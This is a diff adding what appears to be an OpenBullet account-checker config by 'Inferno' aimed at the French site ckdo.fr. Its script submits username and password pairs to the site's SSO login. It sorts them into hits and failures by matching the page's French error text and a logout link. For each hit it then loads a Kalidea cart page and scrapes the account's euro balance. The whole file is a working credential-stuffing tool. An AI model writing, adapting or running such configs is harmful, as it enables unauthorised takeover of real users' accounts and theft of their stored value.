@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "CKDO.FR | Inferno",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-27T17:41:18.1634132+00:00",
+  "AdditionalInfo": "",
+  "Author": "Inferno",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Post.Inferno REQUEST POST "https://www.ckdo.fr/SSO/Logon" AutoRedirect=TRUE 
+  CONTENT "Text_Login=<USER>&Password_Password=<PASS>&RememberMe=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Votre identifiant et/ou mot de passe est invalide" 
+  KEYCHAIN Success OR 
+    KEY ">Déconnexion" 
+#CAP.Inferno REQUEST GET "https://confort.kalidea.com/MonPanier" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "grandtotal grey\">" "€</" Recursive=FALSE -> CAP "Balance" "" "€" 
